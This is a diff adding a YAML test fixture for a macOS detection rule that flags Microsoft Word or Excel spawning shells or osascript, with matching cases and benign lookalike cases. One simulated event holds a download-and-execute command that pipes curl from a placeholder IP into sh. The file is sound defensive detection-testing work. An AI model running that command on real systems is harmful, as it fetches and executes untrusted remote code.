@@ -1,0 +1,14 @@
+match:
+  - desc: "Word spawns a shell (macro dropping a payload)"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5101, "ppid": 4000, "exe": "/bin/sh", "name": "sh", "args": ["sh", "-c", "curl -s http://198.51.100.7/x | sh"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.sh", "parent": {"pid": 4000, "exe": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", "name": "Microsoft Word"}}}
+  - desc: "Excel spawns osascript"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5102, "ppid": 4000, "exe": "/usr/bin/osascript", "name": "osascript", "args": ["osascript", "-e", "do shell script \"id\""], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osascript", "parent": {"pid": 4000, "exe": "/Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel", "name": "Microsoft Excel"}}}
+nomatch:
+  - desc: "benign lookalike - Word starts its own updater helper"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5111, "ppid": 4000, "exe": "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate", "name": "Microsoft AutoUpdate", "args": ["Microsoft AutoUpdate"], "uid": 501, "euid": 501, "is_platform": false, "is_signed": true, "parent": {"pid": 4000, "exe": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", "name": "Microsoft Word"}}}
+  - desc: "Terminal (not Office) starts zsh"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5112, "ppid": 4000, "exe": "/bin/zsh", "name": "zsh", "args": ["-zsh"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.zsh", "parent": {"pid": 4000, "exe": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", "name": "Terminal"}}}
